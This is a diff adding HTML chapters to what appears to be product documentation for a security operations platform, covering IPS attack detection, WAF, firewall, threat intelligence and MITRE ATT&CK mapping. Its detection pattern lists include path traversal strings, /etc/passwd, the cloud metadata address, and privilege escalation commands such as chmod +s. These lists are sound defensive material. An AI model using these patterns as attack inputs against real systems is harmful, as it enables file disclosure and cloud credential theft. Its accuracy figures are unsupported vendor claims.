+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Response:</strong> Block + Isolate System + Log Forensics — Elevated to Critical when FIM confirms file creation
+      </div>
+    </div>
+
+    <div class="attack-card high">
+      <div class="attack-name">🟠 Path Traversal / LFI</div>
+      <div class="attack-desc">Attacker uses ../  sequences to navigate outside intended directories and access sensitive system files like /etc/passwd, /etc/shadow, or application config files.</div>
+      <div class="attack-badges">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-blue">Path Patterns</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:44%; background:#ea580c;"></div></div>
+        <span class="severity-bar-pct">44%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> ../,  %2e%2e/, %2f, ..../, /etc/passwd, /proc/self, Windows \..\ path traversal
+      </div>
+    </div>
+
+    <div class="attack-card high">
+      <div class="attack-name">🟠 DNS Tunneling</div>
+      <div class="attack-desc">Data exfiltration or C2 communication hidden inside DNS queries using Base64/hex encoding in subdomain fields. Detects unusually long, high-entropy DNS requests.</div>
+      <div class="attack-badges">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-blue">Entropy Analysis</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:29%; background:#ea580c;"></div></div>
+        <span class="severity-bar-pct">29%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> Long DNS labels, high entropy base64 in subdomains, excessive TXT records, dnscat2 signatures
+      </div>
+    </div>
+
+    <div class="attack-card high">
+      <div class="attack-name">🟠 Port Scan</div>
+      <div class="attack-desc">Systematic probing of multiple ports to discover open services and vulnerabilities. Triggered when &gt;10 distinct ports are contacted from a single IP within the rate window.</div>
+      <div class="attack-badges">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-blue">Rate-Based</span>
+        <span class="badge badge-purple">Score +70</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:61%; background:#ea580c;"></div></div>
+        <span class="severity-bar-pct">61%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Detected Tools:</strong> Nmap, Masscan, Nessus, Shodan, ZMap — identified via user-agent and scan timing patterns
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Server-Side Request Forgery (SSRF)</div>
+      <div class="attack-desc">Attacker tricks the server into making requests to internal systems, cloud metadata endpoints, or internal APIs. Commonly used to pivot into cloud infrastructure or internal services.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">URL Analysis</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:33%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">33%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> 169.254.169.254 (AWS metadata), localhost, 127.0.0.1, file://, internal hostnames in URL params
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Data Exfiltration</div>
+      <div class="attack-desc">Unauthorized transfer of sensitive data from the network. Detected via oversized outbound payloads, unusual destination IPs, timing patterns, and DNS tunneling correlations.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">Behavioral</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:27%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">27%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Indicators:</strong> Content-Length &gt;1MB to external, unusual port usage, encrypted channel to new destination, after-hours timing
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Privilege Escalation</div>
+      <div class="attack-desc">Attacker attempts to gain elevated access beyond their authorization level. Detected through sudo/runas patterns, SUID bit changes, kernel exploit signatures, and Windows token manipulation.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">Payload + FIM</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:35%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">35%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> sudo su, chmod +s, /etc/sudoers modification, Windows UAC bypass, token impersonation
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Credential Theft</div>
+      <div class="attack-desc">Attempts to extract passwords, API keys, tokens, or credentials from memory, files, or network traffic. Detects pass-the-hash, Mimikatz signatures, and LSASS memory access.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">Signature + Behavioral</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:42%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">42%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Tools Detected:</strong> Mimikatz, LaZagne, ProcDump, LSASS access, credential manager queries, keylogger patterns
+      </div>
+    </div>
+  </div>
+
+  <h2>7.4 Response Action Hierarchy</h2>
+  <table>
+    <thead><tr><th>Threat Level</th><th>Score Range</th><th>Automated Actions</th><th>Human Escalation</th><th>SLA</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><span class="badge badge-critical">Critical</span></td>
+        <td>80–100</td>
+        <td>Block IP, Alert SOC, Log Forensics, Isolate System (if applicable), Geo-Block (for DDoS/Botnet)</td>
+        <td>L2/L3 Analyst + CISO</td>
+        <td>&lt;5 min</td>
+      </tr>
+      <tr>
+        <td><span class="badge badge-high">High</span></td>
+        <td>55–79</td>
+        <td>Block IP, Rate Limit, Log Event, Alert Analyst; + Isolate System for Web Shell / Command Injection</td>
+        <td>L2 Analyst</td>
+        <td>&lt;15 min</td>
+      </tr>
+      <tr>
+        <td><span class="badge badge-medium">Medium</span></td>
+        <td>30–54</td>
+        <td>Rate Limit, Log Event, Whitelist Review</td>
+        <td>L1 Analyst review</td>
+        <td>&lt;60 min</td>
+      </tr>
+      <tr>
+        <td><span class="badge badge-low">Low</span></td>
+        <td>0–29</td>
+        <td>Monitor, Log Event</td>
+        <td>Automated (no escalation)</td>
+        <td>Next business day</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>7.5 Scanner &amp; Reconnaissance Tool Detection</h2>
+  <p>
+    Beyond attack payload detection, the IPS engine maintains a curated database of <strong>security scanner user agents and reconnaissance tools</strong>.
+    When detected, these tools automatically trigger elevated scoring regardless of payload content, as they indicate active pre-attack reconnaissance.
+  </p>
+  <table>
+    <thead><tr><th>Scanner Tool</th><th>Category</th><th>Detection Method</th><th>Score Impact</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Nmap</strong></td><td>Port Scanner</td><td>User-Agent + Port scan pattern</td><td>+50</td></tr>
+      <tr><td><strong>Masscan</strong></td><td>Port Scanner</td><td>User-Agent + packet timing</td><td>+50</td></tr>
+      <tr><td><strong>Nikto</strong></td><td>Web Scanner</td><td>User-Agent signature</td><td>+50</td></tr>
+      <tr><td><strong>SQLMap</strong></td><td>SQLi Scanner</td><td>User-Agent + SQLi payload combo</td><td>+50</td></tr>
+      <tr><td><strong>Burp Suite</strong></td><td>Web Proxy/Scanner</td><td>User-Agent signature</td><td>+50</td></tr>
+      <tr><td><strong>Metasploit</strong></td><td>Exploit Framework</td><td>User-Agent + payload signatures</td><td>+50</td></tr>
+      <tr><td><strong>Hydra</strong></td><td>Password Cracker</td><td>User-Agent + brute force rate</td><td>+50+</td></tr>
+      <tr><td><strong>Acunetix</strong></td><td>Web Vulnerability Scanner</td><td>User-Agent signature</td><td>+50</td></tr>
+      <tr><td><strong>Missing User-Agent</strong></td><td>Suspicious Request</td><td>Empty/minimal User-Agent header</td><td>+10</td></tr>
+    </tbody>
+  </table>
+
+  <h2>7.6 IP Reputation Classification</h2>
+  <table>
+    <thead><tr><th>Reputation Category</th><th>Score Impact</th><th>Auto-Action</th><th>Confidence</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Malicious</strong></td><td>+70</td><td>Block IP immediately</td><td>90%</td></tr>
+      <tr><td><strong>Botnet</strong></td><td>+80</td><td>Block + Geo-block + SOC Alert</td><td>95%</td></tr>
+      <tr><td><strong>TOR Exit Node</strong></td><td>+40</td><td>Rate limit + Alert</td><td>85%</td></tr>
+      <tr><td><strong>Anonymous Proxy</strong></td><td>+20</td><td>Log + Monitor</td><td>70%</td></tr>
+      <tr><td><strong>Clean</strong></td><td>0</td><td>Score based on other factors only</td><td>—</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 8 — WAF
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 08</div>
+    <div class="chapter-title">WAF — Web Application Firewall</div>
+    <div class="chapter-subtitle">Layer-7 inspection, real-time HTTP/HTTPS threat blocking, and application protection</div>
+  </div>
+
+  <p>
+    The AJNAT WAF operates at Layer 7 (Application Layer) to inspect every HTTP and HTTPS request before it reaches backend application servers.
+    Unlike the network-layer IPS which inspects raw packets, the WAF understands the full HTTP protocol context —
+    headers, cookies, request body, URL parameters, and response payloads — enabling highly accurate detection
+    with minimal false positives.
+  </p>
+
+  <h2>8.1 WAF Detection Architecture</h2>
+  <div class="flow-steps">
+    <div class="flow-step">
+      <div class="flow-step-num">1</div>
+      <div class="flow-step-content">
+        <h4>Request Interception</h4>
+        <p>Every HTTP/HTTPS request is intercepted by the WAF agent before reaching the backend application. TLS termination allows full inspection of encrypted traffic.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">2</div>
+      <div class="flow-step-content">
+        <h4>Multi-Dimensional Threat Analysis</h4>
+        <p>The WAF engine (classifyThreat function) calculates a composite risk score from: Failed authentication tracking, Request rate analysis, IP reputation lookup, Port activity monitoring, Payload deep inspection using the full attack pattern library.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">3</div>
+      <div class="flow-step-content">
+        <h4>Attack Classification &amp; Scoring</h4>
+        <p>Matched attacks receive the primary ATTACK_TYPE classification, confidence scoring per vector, and a composite threat level (Critical/High/Medium/Low).</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">4</div>
+      <div class="flow-step-content">
+        <h4>Action Execution</h4>
+        <p>Based on threat level: Block (Critical/High), Rate-Limit (Medium), Monitor (Low). Events stored in waf_events collection with full payload capture for forensics.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">5</div>
+      <div class="flow-step-content">
+        <h4>Real-Time SOC Reporting</h4>
+        <p>WAF events stream to the SIEM in real time, aggregated by attack type, severity, and source IP for 24-hour statistical analysis available in the SOC dashboard.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">WAF Attacks Blocked — Top Attack Types (24h)</div>
+      <canvas id="wafAttackChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">WAF Traffic: Clean vs. Blocked (Weekly Trend)</div>
+      <canvas id="wafTrendChart"></canvas>
+    </div>
+  </div>
+
+  <h2>8.2 WAF Event Data Model</h2>
+  <p>Every WAF event captured includes the following data fields for forensic and compliance purposes:</p>
+  <table>
+    <thead><tr><th>Field</th><th>Type</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td><code>ts</code></td><td>Date</td><td>Timestamp of the attack event (UTC)</td></tr>
+      <tr><td><code>ip</code></td><td>String</td><td>Source IP address of attacker</td></tr>
+      <tr><td><code>attackType</code></td><td>String</td><td>Classified attack type from ATTACK_TYPES registry</td></tr>
+      <tr><td><code>severity</code></td><td>String</td><td>critical / high / medium / low</td></tr>
+      <tr><td><code>score</code></td><td>Number</td><td>Composite risk score (0–100)</td></tr>
+      <tr><td><code>confidence</code></td><td>Object</td><td>Per-vector confidence scores (sql_injection, xss, ddos, etc.)</td></tr>
+      <tr><td><code>payload</code></td><td>String</td><td>Captured request payload (sanitized for storage)</td></tr>
+      <tr><td><code>company</code></td><td>String</td><td>Tenant company ID for multi-tenant isolation</td></tr>
+      <tr><td><code>recommendedAction</code></td><td>Array</td><td>List of recommended response actions</td></tr>
+      <tr><td><code>agentId</code></td><td>String</td><td>WAF agent that captured the event</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 9 — NETWORK FIREWALL
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 09</div>
+    <div class="chapter-title">Network Firewall &amp; Traffic Inspection</div>
+    <div class="chapter-subtitle">Stateful packet filtering, IP/Port/Protocol enforcement, and network segmentation</div>
+  </div>
+
+  <p>
+    The AJNAT Network Firewall provides stateful Layer 3/4 packet filtering, enforcing IP-based, port-based, and protocol-based
+    access control across all network segments. Unlike traditional perimeter firewalls, AJNAT's firewall is deeply integrated
+    with the threat intelligence feed and IPS engine — automatically adding block rules when the IPS or WAF detects a critical threat.
+  </p>
+
+  <h2>9.1 Firewall Rule Model</h2>
+  <table>
+    <thead><tr><th>Field</th><th>Description</th><th>Example</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Rule Name</strong></td><td>Descriptive identifier for the rule</td><td>"Block Tor Exit Nodes"</td></tr>
+      <tr><td><strong>Action</strong></td><td>allow / deny / log-only</td><td>deny</td></tr>
+      <tr><td><strong>Protocol</strong></td><td>TCP / UDP / ICMP / Any</td><td>TCP</td></tr>
+      <tr><td><strong>Source IP / Range</strong></td><td>CIDR block or specific IP</td><td>192.168.0.0/24</td></tr>
+      <tr><td><strong>Destination Port</strong></td><td>Single port or range</td><td>443, 8080-8090</td></tr>
+      <tr><td><strong>Direction</strong></td><td>Inbound / Outbound / Both</td><td>Inbound</td></tr>
+      <tr><td><strong>Priority</strong></td><td>Rule evaluation order (lower = first)</td><td>10</td></tr>
+      <tr><td><strong>Auto-Block</strong></td><td>Dynamically added by IPS/WAF for detected threats</td><td>True (expires 24h)</td></tr>
+      <tr><td><strong>Expiry</strong></td><td>Optional time-based auto-expiry for dynamic blocks</td><td>2025-12-31T00:00:00Z</td></tr>
+    </tbody>
+  </table>
+
+  <h2>9.2 Dynamic Firewall Integration</h2>
+  <p>
+    When the IPS engine detects a Critical or High-severity threat, the Firewall Service receives an automated blocking instruction
+    with the source IP, attack type, and recommended block duration. The Firewall Service then:
+  </p>
+  <ul>
+    <li>Adds a deny rule for the source IP with highest priority</li>
+    <li>Logs the auto-block event with full attack context</li>
+    <li>Sets an expiry time (configurable: 1h, 24h, 7d, or permanent)</li>
+    <li>Notifies the SOC dashboard of the new block rule</li>
+    <li>Allows SOC analyst to review, extend, or remove the block via the dashboard</li>
+  </ul>
+
+  <div class="metric-grid">
+    <div class="metric-card red">
+      <div class="metric-value">Auto</div>
+      <div class="metric-label">IP Blocking</div>
+      <div class="metric-sub">IPS → Firewall pipeline</div>
+    </div>
+    <div class="metric-card blue">
+      <div class="metric-value">1ms</div>
+      <div class="metric-label">Rule Propagation</div>
+      <div class="metric-sub">Block takes effect</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">10K+</div>
+      <div class="metric-label">Rules Supported</div>
+      <div class="metric-sub">Per company tenant</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">GeoIP</div>
+      <div class="metric-label">Country Blocking</div>
+      <div class="metric-sub">Bulk geo-block support</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 10 — THREAT INTELLIGENCE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 10</div>
+    <div class="chapter-title">Threat Intelligence Platform</div>
+    <div class="chapter-subtitle">IOC/IOA enrichment, STIX/TAXII feeds, and global threat intelligence integration</div>
+  </div>
+
+  <p>
+    The AJNAT Threat Intelligence Platform (TIP) aggregates, normalizes, and operationalizes threat data from
+    global intelligence sources. Every IP, domain, URL, file hash, and email address entering the platform is
+    automatically enriched with threat intelligence context — enabling analysts to immediately understand
+    whether an indicator has been seen in previous attacks, who the threat actor is, and what campaign it belongs to.
+  </p>
+
+  <h2>10.1 Threat Intelligence Sources</h2>
+  <table>
+    <thead><tr><th>Feed</th><th>Type</th><th>Update Frequency</th><th>Coverage</th></tr></thead>
+    <tbody>
+      <tr><td><strong>AlienVault OTX</strong></td><td>Community + Commercial</td><td>Real-time</td><td>IPs, Domains, URLs, Hashes, CVEs</td></tr>
+      <tr><td><strong>Emerging Threats</strong></td><td>Open-source rules</td><td>Daily</td><td>Network attack signatures</td></tr>
+      <tr><td><strong>Cisco Talos</strong></td><td>Commercial</td><td>Real-time</td><td>IP reputation, Malware, Phishing</td></tr>
+      <tr><td><strong>VirusTotal</strong></td><td>Commercial API</td><td>Real-time</td><td>File hashes, URLs, IP reputation</td></tr>
+      <tr><td><strong>AbuseIPDB</strong></td><td>Community</td><td>Real-time</td><td>IP abuse reports</td></tr>
+      <tr><td><strong>Shodan</strong></td><td>Commercial</td><td>Periodic</td><td>Exposed services, CVEs by IP</td></tr>
+      <tr><td><strong>MISP (Private)</strong></td><td>Private sharing</td><td>Real-time push</td><td>Government ISAC sharing</td></tr>
+      <tr><td><strong>STIX/TAXII</strong></td><td>Standard protocol</td><td>Configurable</td><td>Structured threat data sharing</td></tr>
+    </tbody>
+  </table>
+
+  <h2>10.2 IOC Types Supported</h2>
+  <div class="metric-grid">
+    <div class="metric-card blue">
+      <div class="metric-value">IP</div>
+      <div class="metric-label">Address & Range</div>
+    </div>
+    <div class="metric-card cyan">
+      <div class="metric-value">FQDN</div>
+      <div class="metric-label">Domain / Subdomain</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">URL</div>
+      <div class="metric-label">Malicious URLs</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">Hash</div>
+      <div class="metric-label">MD5 / SHA-1 / SHA-256</div>
+    </div>
+  </div>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">Threat Intel Hits by IOC Type (30 Days)</div>
+      <canvas id="tiocChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Threat Intel Source Contribution</div>
+      <canvas id="tiSourceChart"></canvas>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 11 — AI DETECTION ENGINE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 11</div>
+    <div class="chapter-title">AI-Powered Detection Engine</div>
+    <div class="chapter-subtitle">Machine learning models, risk scoring, and autonomous threat classification</div>
+  </div>
+
+  <p>
+    The AJNAT AI Detection Engine is the intelligence core of the platform. It operates continuously across all event streams —
+    network packets, endpoint telemetry, log data, and threat intelligence enrichments — applying machine learning models
+    to detect threats that evade traditional signature-based detection. The engine produces a unified <strong>Risk Score</strong>
+    for every entity (IP, user, process, host) in the environment.
+  </p>
+
+  <div class="metric-grid">
+    <div class="metric-card purple">
+      <div class="metric-value">ML</div>
+      <div class="metric-label">Continuous Learning</div>
+      <div class="metric-sub">Models retrain daily</div>
+    </div>
+    <div class="metric-card blue">
+      <div class="metric-value">0–100</div>
+      <div class="metric-label">Risk Score Scale</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">99.7%</div>
+      <div class="metric-label">Detection Accuracy</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">&lt;0.3%</div>
+      <div class="metric-label">False Positive Rate</div>
+    </div>
+  </div>
+
+  <h2>11.1 AI Model Architecture</h2>
+  <table>
+    <thead><tr><th>Model</th><th>Algorithm</th><th>Input Features</th><th>Use Case</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Behavioral Baseline</strong></td><td>Statistical profiling + z-score</td><td>Login times, data volumes, connection patterns</td><td>User/Entity behavioral anomalies</td></tr>
+      <tr><td><strong>Network Anomaly</strong></td><td>Isolation Forest</td><td>Packet counts, port diversity, timing</td><td>DDoS, Port scans, Exfiltration</td></tr>
+      <tr><td><strong>Threat Classifier</strong></td><td>Gradient Boosting</td><td>Event features, payload markers, enrichment</td><td>Attack type classification</td></tr>
+      <tr><td><strong>Time-Series Detector</strong></td><td>LSTM Neural Network</td><td>Event sequences over time</td><td>APT lateral movement, slow attacks</td></tr>
+      <tr><td><strong>NLP Payload Analyzer</strong></td><td>Regex + Semantic analysis</td><td>HTTP body, URLs, headers</td><td>Injection attacks, obfuscated payloads</td></tr>
+    </tbody>
+  </table>
+
+  <h2>11.2 Confidence Score Architecture</h2>
+  <p>
+    Unlike binary alert systems, AJNAT AI produces <strong>per-vector confidence scores</strong> for every detected threat.
+    This enables analysts to see exactly which aspect of the traffic triggered the highest confidence detection:
+  </p>
+  <pre>confidence: {
+  sql_injection:       0–100,  // SQL payload pattern confidence
+  xss:                 0–100,  // XSS pattern confidence
+  ddos:                0–100,  // DDoS/flood confidence
+  port_scan:           0–100,  // Port scan confidence
+  command_injection:   0–100,  // Command injection confidence
+  web_shell:           0–100,  // Web shell injection confidence
+  malware:             0–100,  // Malware signature confidence
+}</pre>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 12 — ANOMALY DETECTION
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 12</div>
+    <div class="chapter-title">Anomaly Detection &amp; Behavioral Analysis</div>
+    <div class="chapter-subtitle">UEBA, statistical baselining, and zero-day threat detection through behavioral analysis</div>
+  </div>
+
+  <p>
+    Anomaly detection represents the most advanced layer of AJNAT's threat detection stack. While signature-based detection
+    catches known attacks, behavioral anomaly detection catches <strong>zero-day threats, insider threats, and sophisticated APTs</strong>
+    that deliberately avoid known attack patterns. AJNAT builds detailed behavioral profiles (baselines) for every user, device,
+    and network entity — and alerts on statistically significant deviations from that baseline.
+  </p>
+
+  <h2>12.1 User &amp; Entity Behavior Analytics (UEBA)</h2>
+  <table>
+    <thead><tr><th>Entity Type</th><th>Baseline Metrics</th><th>Anomaly Triggers</th></tr></thead>
+    <tbody>
+      <tr><td><strong>User Accounts</strong></td><td>Login hours, locations, data access patterns, application usage</td><td>Login at unusual time, new country, mass data download</td></tr>
+      <tr><td><strong>Endpoints</strong></td><td>Process tree, network connections, resource utilization</td><td>New process, unusual outbound connection, CPU/RAM spike</td></tr>
+      <tr><td><strong>Service Accounts</strong></td><td>API call patterns, data access scope</td><td>Accessing unusual resources, credential reuse</td></tr>
+      <tr><td><strong>Network Traffic</strong></td><td>Flow volumes, protocols, peer relationships</td><td>New peer, protocol change, volume spike</td></tr>
+      <tr><td><strong>Servers / Applications</strong></td><td>Request rates, error rates, response times</td><td>Sudden traffic spike, error surge, new path access</td></tr>
+    </tbody>
+  </table>
+
+  <h2>12.2 Statistical Anomaly Scoring</h2>
+  <p>
+    AJNAT uses a rolling 30-day baseline window and applies statistical thresholds at 2σ (medium alert) and 3σ (high alert)
+    standard deviations from normal behavior. Anomaly scores are combined with threat intelligence enrichment and
+    attack pattern matching to produce a final composite risk score.
+  </p>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">Anomaly Detection Rate — 12-Week Trend</div>
+      <canvas id="anomalyTrendChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">UEBA Alert Categories (30 Days)</div>
+      <canvas id="uebaChart"></canvas>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 13 — MITRE ATT&CK
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 13</div>
+    <div class="chapter-title">MITRE ATT&amp;CK Framework Integration</div>
+    <div class="chapter-subtitle">Mapping every detected threat to MITRE ATT&CK tactics, techniques, and sub-techniques</div>
+  </div>
+
+  <p>
+    Every alert generated by AJNAT SOC is automatically mapped to the <strong>MITRE ATT&amp;CK Enterprise Framework</strong> —
+    the globally recognized knowledge base of adversary tactics, techniques, and procedures (TTPs). This mapping enables
+    SOC analysts to immediately understand where in the attack chain a detected event falls, what the adversary's objective
+    is, and what countermeasures are most effective.
+  </p>
+
+  <h2>13.1 AJNAT IPS → MITRE ATT&amp;CK Mapping</h2>
+  <table>
+    <thead><tr><th>Attack Type</th><th>MITRE Tactic</th><th>Technique ID</th><th>Technique Name</th></tr></thead>
+    <tbody>
+      <tr><td>SQL Injection</td><td>Initial Access / Exfiltration</td><td>T1190 / T1048</td><td>Exploit Public-Facing Application / Exfiltration over Alt Protocol</td></tr>
+      <tr><td>XSS</td><td>Initial Access</td><td>T1189</td><td>Drive-by Compromise</td></tr>
+      <tr><td>Brute Force</td><td>Credential Access</td><td>T1110</td><td>Brute Force (Password Guessing)</td></tr>
+      <tr><td>DDoS</td><td>Impact</td><td>T1498</td><td>Network Denial of Service</td></tr>
+      <tr><td>Port Scan</td><td>Discovery / Reconnaissance</td><td>T1046 / T1595</td><td>Network Service Scanning / Active Scanning</td></tr>
+      <tr><td>Malware</td><td>Execution / Persistence</td><td>T1059 / T1543</td><td>Command &amp; Scripting Interpreter / Create System Service</td></tr>
+      <tr><td>Botnet</td><td>Command &amp; Control</td><td>T1071</td><td>Application Layer Protocol (C2)</td></tr>
+      <tr><td>Data Exfiltration</td><td>Exfiltration</td><td>T1041</td><td>Exfiltration over C2 Channel</td></tr>
+      <tr><td>Privilege Escalation</td><td>Privilege Escalation</td><td>T1068 / T1548</td><td>Exploitation for Privilege Escalation / Sudo and Sudo Caching</td></tr>
+      <tr><td>Credential Theft</td><td>Credential Access</td><td>T1003</td><td>OS Credential Dumping (Mimikatz, LSASS)</td></tr>
+      <tr><td>Web Shell</td><td>Persistence / Execution</td><td>T1505.003</td><td>Server Software Component: Web Shell</td></tr>
+      <tr><td>Command Injection</td><td>Execution</td><td>T1059</td><td>Command and Scripting Interpreter</td></tr>
+      <tr><td>Path Traversal</td><td>Discovery</td><td>T1083</td><td>File and Directory Discovery</td></tr>
+      <tr><td>SSRF</td><td>Discovery / Lateral Movement</td><td>T1590 / T1210</td><td>Gather Victim Network Info / Exploitation of Remote Services</td></tr>
+      <tr><td>Log4Shell</td><td>Initial Access / Execution</td><td>T1190 / T1203</td><td>Exploit Public-Facing Application / Exploitation for Client Execution</td></tr>
+      <tr><td>DNS Tunneling</td><td>Command &amp; Control / Exfiltration</td><td>T1071.004 / T1048</td><td>DNS (Application Layer Protocol) / Exfiltration over Alt Protocol</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 14 — INCIDENT RESPONSE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 14</div>
+    <div class="chapter-title">Incident Response Lifecycle</div>
+    <div class="chapter-subtitle">Structured 6-phase incident response from detection through post-incident review</div>
+  </div>
+
+  <p>
+    AJNAT SOC implements the industry-standard <strong>6-phase incident response lifecycle</strong> aligned with
+    NIST SP 800-61 and ISO/IEC 27035. The platform automates the first 1–3 phases entirely, compressing the
+    time from detection to initial containment from hours to seconds.
+  </p>
+
+  <div class="flow-steps">
+    <div class="flow-step">
+      <div class="flow-step-num">1</div>
+      <div class="flow-step-content">
+        <h4>Detection &amp; Identification</h4>
+        <p>Automated: SIEM correlation, IPS detection, AI anomaly alerts, and threat intel matches trigger incidents. Every alert includes full context, severity, MITRE ATT&amp;CK mapping, and recommended actions.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">2</div>
+      <div class="flow-step-content">
+        <h4>Triage &amp; Classification</h4>
+        <p>Automated: AI engine validates and scores alerts, suppresses false positives, and assigns severity. L1 analysts review Medium-severity alerts; L2/L3 handle High and Critical automatically escalated cases.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">3</div>
+      <div class="flow-step-content">
+        <h4>Containment</h4>
+        <p>Automated (Critical/High): SOAR executes containment playbook — IP blocks, endpoint isolation, credential revocation. Manual: Analyst reviews and approves for medium severity or whitelisted assets.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">4</div>
+      <div class="flow-step-content">
+        <h4>Eradication</h4>
+        <p>Analyst-led with platform support: Remove malware, close attack vectors, patch vulnerabilities, remove malicious accounts, restore clean system state from verified backups.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">5</div>
